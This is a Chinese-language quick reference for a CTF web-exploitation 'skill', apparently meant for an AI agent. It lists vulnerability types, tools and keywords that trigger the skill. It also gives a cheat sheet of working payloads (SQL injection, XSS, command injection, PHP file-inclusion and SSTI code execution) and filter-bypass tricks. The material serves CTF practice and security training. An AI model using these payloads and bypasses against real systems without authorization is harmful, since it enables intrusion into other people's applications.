# CTF Web Skill - 快速参考

## 目录结构
```
.agent/
└── skills/
    └── ctf-web-skill/
        ├── SKILL.md           # 核心 Skill 定义
        ├── modules/           # 详细模块
        │   ├── recon.md       # 信息搜集
        │   ├── sqli.md        # SQL 注入
        │   ├── xss.md         # XSS 攻击
        │   ├── rce.md         # 命令执行
        │   ├── lfi.md         # 文件包含
        │   ├── upload.md      # 文件上传
        │   ├── ssrf.md        # SSRF
        │   ├── ssti.md        # SSTI
        │   ├── xxe.md         # XXE
        │   ├── deserialize.md # 反序列化
        │   ├── php.md         # PHP 特性
        │   ├── jwt.md         # JWT 攻击
        │   ├── java.md        # Java 审计
        │   ├── blockchain.md  # 区块链安全
        │   └── cve.md         # 组件漏洞
        └── docs/
            ├── QUICKREF.md    # 快速参考
            ├── TOOLS.md       # 工具指南
            └── PAYLOADS.md    # Payload 集合
```

## 支持的题型

| 类型 | 覆盖范围 | 关键工具 |
|------|---------|---------|
| **SQL 注入** | 联合/报错/盲注/堆叠 | sqlmap, Burp |
| **XSS** | 反射/存储/DOM | XSStrike, BeEF |
| **命令执行** | 系统命令/代码执行 | 手工payload |
| **文件包含** | LFI/RFI/伪协议 | php://filter |
| **文件上传** | 绕过/解析漏洞 | 手工构造 |
| **SSRF** | 协议/内网 | Gopherus |
| **SSTI** | Jinja2/Twig/Freemarker | tplmap |
| **XXE** | 有回显/无回显 | 手工payload |
| **反序列化** | PHP/Java/Python | ysoserial, phpggc |
| **PHP 特性** | 弱类型/变量覆盖 | 手工分析 |
| **JWT** | None/弱密钥/混淆 | jwt_tool |
| **Java 审计** | Spring/Struts/Shiro | 代码审计 |
| **区块链** | 智能合约漏洞 | Foundry, Remix |
| **组件漏洞** | CVE 利用 | Nuclei |

## 快速开始

### 触发关键词
```
"SQL 注入"、"XSS"、"命令执行"、"文件包含"
"上传绕过"、"SSRF"、"SSTI"、"XXE"
"反序列化"、"JWT"、"代码审计"
"CVE"、"漏洞利用"
```

### 常用工作流

```bash
# 1. 信息搜集
whatweb http://target.com
dirsearch -u http://target.com

# 2. 漏洞检测
sqlmap -u "http://target.com/?id=1"
nuclei -u http://target.com

# 3. 漏洞利用
# 根据漏洞类型选择对应 payload
```

## Payload 速查

### SQL 注入
```sql
' OR 1=1--
' UNION SELECT 1,2,3--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
```

### XSS
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 命令执行
```bash
; id
| id
`id`
$(id)
```

### 文件包含
```
php://filter/read=convert.base64-encode/resource=index.php
php://input + POST: <?php system('id'); ?>
```

### SSTI
```
{{7*7}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## 必备工具

```yaml
信息搜集:
  - nmap, dirsearch, ffuf
  - whatweb, wappalyzer
  
Web 测试:
  - Burp Suite
  - sqlmap
  - XSStrike
  
漏洞利用:
  - ysoserial (Java 反序列化)
  - phpggc (PHP 反序列化)
  - Gopherus (SSRF)
  - jwt_tool (JWT)
  
辅助工具:
  - CyberChef (编码解码)
  - HackBar (浏览器插件)
```

## 绕过技巧

### 通用绕过
```yaml
编码绕过:
  - URL 编码: %27 -> '
  - 双重编码: %2527 -> %27 -> '
  - Unicode: \u0027 -> '
  - HTML 实体: &#39; -> '
  
大小写绕过:
  - SeLeCt, UnIoN
  
空格绕过:
  - /**/, %09, %0a, ${IFS}
  
关键字绕过:
  - 双写: selselectect
  - 拼接: sel'+'ect
```

